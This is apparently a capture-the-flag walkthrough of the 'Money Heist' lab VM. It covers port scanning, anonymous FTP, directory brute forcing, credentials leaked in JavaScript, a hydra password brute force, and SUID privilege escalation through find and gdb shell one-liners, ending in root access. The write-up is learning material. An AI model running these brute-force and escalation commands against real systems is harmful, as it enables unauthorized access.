**FInding IP of the machine:
`Command: sudo netdiscover -i wlan0`

**Now Reconnaissance phase:
using nmap:

└─$< nmap -sV -sS -T5 -p- -A  192.168.1.11>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 13:11 EDT
Nmap scan report for 192.168.1.11
Host is up (0.00056s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             138 Nov 19  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Money Heist
55001/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:a6:ca:17:f6:b9:56:01:56:97:60:d1:f5:89:61:9e (RSA)
|   256 5b:f3:40:09:8e:41:e5:b7:7b:62:ee:91:a8:b2:fb:ea (ECDSA)
|_  256 df:a4:da:43:0e:37:47:06:76:a1:e4:c8:3f:88:18:a4 (ED25519)
MAC Address: 08:00:27:B6:42:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.1.11

**From observing this, there is an ftp service, we can get ftp login with the user Anonymous
From FTP , got a note.txt

└─$ <ftp 192.168.1.11>
Connected to 192.168.1.11.
220 (vsFTPd 3.0.3)
Name (192.168.1.11:rxj): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||5309|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             138 Nov 19  2020 note.txt
226 Directory send OK.
ftp> more note.txt

//*//  Hi I'm Ángel Rubio partner of investigator Raquel Murillo. We need your help
 to catch the professor, will you help us ?  //*//

ftp> exit
221 Goodbye.


Let's try brute forcing directories :
We'll use the tool gobuster
 Command used:  <gobuster dir -u http://192.168.1.11 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x .html, .php, .py, .txt, .phps>
===============================================================
Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.11
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,
[+] Timeout:                 10s
===============================================================
 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.11/img/]
/index.html           (Status: 200) [Size: 388]
/robots               (Status: 301) [Size: 313] [--> http://192.168.1.11/robots/]
/gate                 (Status: 301) [Size: 311] [--> http://192.168.1.11/gate/]
 Progress: 425121 / 425121 (100.00%)
===============================================================
 Finished
===============================================================

Going through link, http://192.168.1.11/robots/, 
got an image named tokyo.jpeg
Initially that image was not showing properly, SO i check the hex code and there was an error, 

	|File Format|Signature (Hexadecimal)|Description|
	|**JPEG**   |FF D8 FF E0            |Standard JPEG/JFIF image|
	|**PNG**    |89 50 4E 47 0D 0A 1A 0A|PNG image|
	|**GIF**    |47 49 46 38            |GIF image (starts with "GIF8")|
	|**BMP**    |42 4D                  |BMP image (starts with "BM")|
	
JPEG file always starts with the hexadecimal sequence `FF D8 FF` but there was something else, so after changing it, i got the image file.

That's interesting::

Let's keep moving going through wiht through http://192.168.1.11/gate/
Got an gate.exe file, let's see what can be done,


Checking ths sha256 hash in https://www.virustotal.com/. No malicious error
└─$ sha256sum gate.exe       
526009ae0a196cfbb411deb0c3114d8e50d60241a6576858d4c51d32473bad2f  gate.exe

**using _ExifTool_** , to extract metadata and check for errors

└─$ exiftool gate.exe                  
ExifTool Version Number         : 13.25
File Name                       : gate.exe
Directory                       : .
File Size                       : 171 bytes
File Modification Date/Time     : 2025:09:12 13:29:51-04:00
File Access Date/Time           : 2025:09:12 13:45:14-04:00
File Inode Change Date/Time     : 2025:09:12 13:29:54-04:00
File Permissions                : -rw-rw-r--
Error                           : File format error

Error on File format error, Let's check Strings of that file
└─$ strings gate.exe  
noteUT
/BankOfSp41n
noteUT

Interesting find, It is showing a directory, Let's check that out


Nothing is there, let's try brute forcing the directories:
 └─$ gobuster dir -u http://192.168.1.11/BankOfSp41n/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x .html,.php,.py,.txt,.phps  
===============================================================
Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.11/BankOfSp41n/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php,py,txt,phps
 [+] Timeout:                 10s
===============================================================
  Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 384]
/login.php            (Status: 200) [Size: 1434]
 Progress: 1323348 / 1323348 (100.00%)
===============================================================
 Finished
===============================================================
A Login Page:

[login page pic]

First always check the source code.... 

[pic of source code:login.php]

There is an interesting file link to this website:

|<script src="CR3D5.js"></script>|

Content of http://192.168.1.11/BankOfSp41n/CR3D5.js :
function check(form)
{
if(form.userid.value == "anonymous" && form.pwd.value == "B1tCh")
{
        return true;
}
else
{
        alert("Hahaha! Wrong Person!")
        return false;
}
}

From here, it can be seen that , it is a function designed to validate login credentials. The function checks if the values entered into the form fields match specific criteria.

- **_form.userid.value_** must be equal to " **_anonymous_** ".
- **_form.pwd.value_** must be equal to " **_B1tCh_** ".

This JavaScript code provides the exact credentials needed to successfully login: 

- Username: **_anonymous_**
- Password: **_B1tCh_**

Again checking the source page after loging:
This is the  message in it:
**<-- Hey! help please I'm Arturo Román they are very-dangerous and one more thing may be old things won't work they are UPDATED, please help me!! -->

This message suggest about the there might be updated credentials and the username arturo 
Let's try to brute force it using a powerful tool hydra

command: < hydra -l arturo -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.11>

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.1.11:21/
[STATUS] 289.00 tries/min, 289 tries in 00:01h, 14344110 to do in 827:14h, 16 active
[STATUS] 278.67 tries/min, 836 tries in 00:03h, 14343563 to do in 857:53h, 16 active
[ERROR] Can not create restore file (./hydra.restore) - Permission denied
[21][ftp] host: 192.168.1.11   login: arturo   password: `corona`
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-12 14:52:05

Cracked it The password it : corona

Logging into the ftp server using arturo:corona

└─$ ftp 192.168.1.11
Connected to 192.168.1.11.
220 (vsFTPd 3.0.3)
Name (192.168.1.11:rxj): arturo
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48636|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             215 Oct 12  2020 secret.txt
226 Directory send OK.
ftp> more secret.txt


/*/ Arturo gets phone somehow and he call at police headquater /*/

        " Hello, I'm Arturo, I'm stuck in there with almost 65-66 hostages,
        and they are total 8 with weapons, one name is Denver, Nairo.... "


Let's look at the imformation we got,
Total 8 with weapon
There are two more names: Denver, Nairobi
Don't you think names are username
let's enumerate a bit more

ftp> pwd
Remote directory: /home/arturo
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||39678|)
150 Here comes the directory listing.
drwxr-xr-x    4 1002     1002         4096 Nov 19  2020 arturo
drwxrwx---    2 1003     1003         4096 Nov 19  2020 denver
drwxrwx---    3 1004     1004         4096 Nov 19  2020 nairobi
drwxrwx---    4 1000     1000         4096 Nov 19  2020 tokyo
226 Directory send OK.

My guess was correct, names are username, 
ftp> cd denver
550 Failed to change directory.
ftp> cd nairobi
550 Failed to change directory.
ftp> cd tokyo
550 Failed to change directory.
Looks like we can't go through these directories.

After thinking so much i though to run nmap again.
i saw there was an ssh running on port 55001.
Let's try logging in with arturo's credentials at this port. 


└─$ ssh arturo@192.168.1.11 -p 55001
The authenticity of host '[192.168.1.11]:55001 ([192.168.1.11]:55001)' can't be established.
ED25519 key fingerprint is SHA256:gD0iLgmeXcwuuD1rCwVuZ2PU/ntvIRWuPp9SqMYCShQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.1.11]:55001' (ED25519) to the list of known hosts.


:::       ::: :::::::::: :::        ::::::::   ::::::::  ::::    ::::  :::::::::: 
:+:       :+: :+:        :+:       :+:    :+: :+:    :+: +:+:+: :+:+:+ :+:        
+:+       +:+ +:+        +:+       +:+        +:+    +:+ +:+ +:+:+ +:+ +:+        
+#+  +:+  +#+ +#++:++#   +#+       +#+        +#+    +:+ +#+  +:+  +#+ +#++:++#   
+#+ +#+#+ +#+ +#+        +#+       +#+        +#+    +#+ +#+       +#+ +#+        
 #+#+# #+#+#  #+#        #+#       #+#    #+# #+#    #+# #+#       #+# #+#        
  ###   ###   ########## ########## ########   ########  ###       ### ########## 

                My eyes on you, so be aware about your commands
                        !!Keep in your mind!!

 
arturo@192.168.1.11's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

98 packages can be updated.
75 updates are security updates.


Last login: Thu Nov 19 23:10:40 2020 from 10.0.2.60
arturo@Money-Heist:~$ 

Got a connection!!! Let's dig into it

arturo@Money-Heist:~$ ls
secret.txt
arturo@Money-Heist:~$ cd ../
arturo@Money-Heist:/home$ ls
arturo  denver  nairobi  tokyo
arturo@Money-Heist:/home$ cd denver/
-bash: cd: denver/: Permission denied
arturo@Money-Heist:/home$ cd nairobi/
-bash: cd: nairobi/: Permission denied
arturo@Money-Heist:/home$ cd tokyo/
-bash: cd: tokyo/: Permission denied
arturo@Money-Heist:/home$ 

Still Can't get into any of these directories. Arturo do not have permission to access these. 
Now this is the time for Privilege escalation:
Let's see what we can do......

Basic command to go higher privilege:

arturo@Money-Heist:/home$ sudo su
[sudo] password for arturo: 
arturo is not in the sudoers file.  This incident will be reported.
arturo@Money-Heist:/home$ sudo -l
[sudo] password for arturo: 
Sorry, user arturo may not run sudo on Money-Heist.

Failed......
Let's enumerate through the tool LinPeas

Linpeas means Linux Privilege Escalation Awesome Script.LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.

Get the linpeas.sh through local python server.

arturo@Money-Heist:~$ wget http://1192.168.1.11:8000/linpeas.sh
--2025-09-13 20:11:23--  http://192.168.1.11:8000/linpeas.sh
Connecting to 10.216.108.115:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 961834 (939K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh              100%[===============================>] 939.29K  --.-KB/s    in 0.004s  

2025-09-13 20:11:23 (222 MB/s) - ‘linpeas.sh’ saved [961834/961834]

Let's execute it..........
After execution there will be a lot of information but we need to look some particular info...
Let's look at files with Interesting permission.


══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                          
                      ╚════════════════════════════════════╝                                                                                                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
strings Not Found                                                                                                                                                                                                                           
---s-ws--x 1 nairobi denver 72K Feb 12  2016 /bin/sed                                                                                                                                                                                       
-rwsr-sr-x 1 tokyo tokyo 31K Dec  4  2012 /bin/nc.openbsd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K Jan 27  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 44K May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 27K Jan 27  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 40K Mar 27  2019 /bin/su
-rwsr-xr-x 1 root root 40K Mar 27  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 23K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 39K Mar 27  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 51K Jan 15  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 33K Mar 27  2019 /usr/bin/newgidmap
---s--s--x 1 denver denver 217K Feb  8  2016 /usr/bin/find
-rwsr-xr-x 1 root root 134K Feb  1  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 74K Mar 27  2019 /usr/bin/gpasswd
-rwsrwx--- 1 tokyo nairobi 6.3M Jun 10  2017 /usr/bin/gdb
-rwsr-xr-x 1 root root 53K Mar 27  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 71K Mar 27  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 33K Mar 27  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 109K Jul 11  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 83K Apr 10  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42K Jun 12  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 419K May 27  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 35K Mar  6  2017 /sbin/mount.cifs



I see here three interesting permission here
*/bin/sed*
*/usr/bin/find*
*/usr/bin/gdb*

We can get the exploit of these permission through a website GTFObin [https://gtfobins.github.io/]
Let's go and search there about find command..

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

- ```
    sudo install -m =xs $(which find) .
    
    ./find . -exec /bin/sh -p \; -quit
    ```

let's run `./find . -exec /bin/sh -p \; -quit` 

arturo@Money-Heist:~$ find . -exec /bin/sh -p \; -quit 
$ whoami
denver
$ cd /home      
$ ls
arturo  denver  nairobi  tokyo
$ cd denver
$ ls
note.txt  secret_diary
$ cat note.txt

================================================================
Denver to others:

        DAMN it!!!! How Arturo gets the Phone ?
        I caught him when he tried to leak our identity in police headquater!! 
        Now I keep him in other room !!

=================================================================

$ cat secret_diary

They all understimate me, mainly Nairobi and Tokyo,  they think only they can lead the team and I can't. 
Tokyo is like Maserati you know. But I hate both of them,
Now I leave a thing on browser which should be secret, Now Nairobi will resposible for this...

/BankOfSp41n/0x987654/

From the secret_diary we get a directory let's try going into it....

After going into it i found this..
Don't trust anyone so quickly, until can see everything clearly!!!



.-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.-


A morse code like text
After going through it hours in it i finally cracked it...... 
i used a tool called cryptii online decoder. 
firstly i looked like morse code but that was not. it was tap code you can read about it here [https://en.wikipedia.org/wiki/Tap_code]. 
after that i tried to logging into nairobi directory but it failed, so there could only be one reason that the code is not fully decrypted yet...
After doing a lot encryption decryption i finally cracked it, 
it was a rot13
**_ROT13_** is a simple substitution cipher where each letter is replaced by the letter 13 positions ahead in the alphabet.
After that still it didn't show any pattern, so i tried multiple decoding algorithm, and i finally got it, it was an  *affine cipher* . and the password is iamabossbitchhere

└─$ ssh nairobi@192.168.29.136 -p 55001


:::       ::: :::::::::: :::        ::::::::   ::::::::  ::::    ::::  :::::::::: 
:+:       :+: :+:        :+:       :+:    :+: :+:    :+: +:+:+: :+:+:+ :+:        
+:+       +:+ +:+        +:+       +:+        +:+    +:+ +:+ +:+:+ +:+ +:+        
+#+  +:+  +#+ +#++:++#   +#+       +#+        +#+    +:+ +#+  +:+  +#+ +#++:++#   
+#+ +#+#+ +#+ +#+        +#+       +#+        +#+    +#+ +#+       +#+ +#+        
 #+#+# #+#+#  #+#        #+#       #+#    #+# #+#    #+# #+#       #+# #+#        
  ###   ###   ########## ########## ########   ########  ###       ### ########## 

                My eyes on you, so be aware about your commands
                        !!Keep in your mind!!

 
nairobi@192.168.29.136's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

98 packages can be updated.
75 updates are security updates.

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Thu Oct 15 14:54:56 2020 from 10.0.2.60
nairobi@Money-Heist:~$ 

We have successfully connected to the user Nairobi....

nairobi@Money-Heist:~$ ls
note.txt
nairobi@Money-Heist:~$ cat note.txt


                                                                                                                                               
                                  ``````.`     +ss-       `.-----`                                                                                    
                                  mdddddddssyyshmmysysssyhddmmmmm:                                                                                    
                                 `Nmmmmmmmddmmddddddmmdddmmmmmmmm/                                                                                    
                                 `/////++/-+mN-----/NN/--:+osssss-                                                                                    
                                       -//yhmmyyysyymmhsyyyyyyyyyyyysyysyyssysyyoosooooooooosooooooooooooo+////////////////////////////+yo////:`      
       `                              .ymmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmydyhy-      
      -hdhhhhhhhhhhhhhhhhhhhhhhhhyyyyyhmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmo:::::::::::::::::::::::::::::::::::::::::::::o/::::-`      
      -dmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmN/                                                           
      -dmmmmmmmmmmmmmmmmmmmmho//sdmmmmmmmmmmmmmmmmmmmmmmmmmmmdhys+++/////+///+++++/+/+//+/.                                                           
      -dmmmmmmmmmmmmmmmmmmmh-`  `-mmmmms+o///+mdmmmmmmmmmdo+:-.``                                                                                     
      -dmmmmmmdhysoosydmmmm/     /mmmdso-/:--:o+mmmmmmmmmy`                                                                                           
      -dmmdho/-.``````-/sdmd/-.-smmmmo.-/////:`:mddhhhyys/                                                                                            
      -hho:.`           `-sdddmmmmmmd/         `--....```                                                                                             
      `..`                `.-:/+syyyo.                                                                                                                
                               ``````      
====================================================================================================================================================

Nairobi was shot by an snipher man, near the  HEART !!

nairobi@Money-Heist:~$ 


Now let's look privilege escalation. we'll use the same method as we did earlier,
using a local python server we'll download the linpeas.sh file 

nairobi@Money-Heist:~$ wget http://192.168.1.11:8000/linpeas.sh
--2025-09-14 09:33:44--  http://192.168.1.11:8000/linpeas.sh
Connecting to 192.168.29.96:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 961834 (939K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh               100%[===============================>] 939.29K  --.-KB/s    in 0.005s  

2025-09-14 09:33:44 (170 MB/s) - ‘linpeas.sh’ saved [961834/961834]

nairobi@Money-Heist:~$ 

Successfully got the file now make it executable and run it.

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                          
                      ╚════════════════════════════════════╝                                                                                                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
strings Not Found                                                                                                                                                                                                                           
You own the SUID file: /bin/sed                                                                                                                                                                                                             
-rwsr-sr-x 1 tokyo tokyo 31K Dec  4  2012 /bin/nc.openbsd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K Jan 27  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 44K May  8  2014 /bin/ping
-rwsr-xr-x 1 root root 27K Jan 27  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 40K Mar 27  2019 /bin/su
-rwsr-xr-x 1 root root 40K Mar 27  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 23K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 39K Mar 27  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 51K Jan 15  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 33K Mar 27  2019 /usr/bin/newgidmap
---s--s--x 1 denver denver 217K Feb  8  2016 /usr/bin/find
-rwsr-xr-x 1 root root 134K Feb  1  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 74K Mar 27  2019 /usr/bin/gpasswd
You can write SUID file: /usr/bin/gdb
-rwsr-xr-x 1 root root 53K Mar 27  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 71K Mar 27  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 33K Mar 27  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 109K Jul 11  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 83K Apr 10  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 15K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42K Jun 12  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 419K May 27  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 35K Mar  6  2017 /sbin/mount.cifs



Looking at the files with interesting permission.. we see the permission of find.
Let's run the command of find that we found in GTFObin
`find . -exec /bin/sh -p \; -quit`

nairobi@Money-Heist:~$ find . -exec /bin/sh -p \; -quit
$ cd /home
$ ls
arturo  denver  nairobi  tokyo
$ cd tokyo
/bin/sh: 3: cd: can't cd to tokyo

Let's try running gdb command from GTFObin:

gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
    
    
    
nairobi@Money-Heist:~$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
Python Exception <class 'ImportError'> No module named 'gdb': 
gdb: warning: 
Could not load the Python gdb module from `/usr/share/gdb/python'.
Limited Python support is available from the _gdb module.
Suggest passing --data-directory=/path/to/gdb/data-directory.

GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
$ whoami
tokyo


$ cd tokyo
$ ls -al
total 36
drwxrwx--- 4 tokyo tokyo 4096 Nov 19  2020 .
drwxr-xr-x 6 root  root  4096 Oct 15  2020 ..
-rw------- 1 tokyo tokyo    8 Nov 19  2020 .bash_history
-rw-r--r-- 1 tokyo tokyo  220 Oct  5  2020 .bash_logout
-rw-r--r-- 1 tokyo tokyo 3771 Oct  5  2020 .bashrc
drwx------ 2 tokyo tokyo 4096 Oct  5  2020 .cache
drwxrwxr-x 2 tokyo tokyo 4096 Nov 19  2020 .nano
-rw-r--r-- 1 tokyo tokyo  655 Oct  5  2020 .profile
-rw-r--r-- 1 tokyo tokyo  133 Nov 19  2020 .sudo_as_admin_successful
$ cat .sudo_as_admin_successful
Romeo Oscar Oscar Tango Stop Papa Alfa Sierra Sierra Whiskey Oscar Romeo Delta : India November Delta India Alfa One Nine Four Seven
$ 

Looks like we have another code to decode


Romeo -> R
Oscar -> O
Oscar -> O
Tango -> T
Stop
Papa -> P 
Alfa -> A
Sierra -> S
Sierra ->S
Whiskey -> W
Oscar -> O
Romeo -> R
Delta ->D
: 
India -> I
November -> N
Delta -> D
India -> I
Alfa -> A
One -> 1
Nine -> 9
Four -> 4
Seven -> 7

root password : india1947
looks this is it 


nairobi@Money-Heist:~$ su root
Password: 
root@Money-Heist:/home/nairobi# cd /root
root@Money-Heist:~# ls
proof.txt
root@Money-Heist:~# cat proof.txt 
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹                                                                           
₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹ ₹                                                                           
                                                                                                                                                                                                                                            
                                 ███████████           ████  ████                         ███                                                                                                                                               
                                ░░███░░░░░███         ░░███ ░░███                        ░░░                                                                                                                                                
                                 ░███    ░███  ██████  ░███  ░███   ██████       ██████  ████   ██████    ██████                                                                                                                            
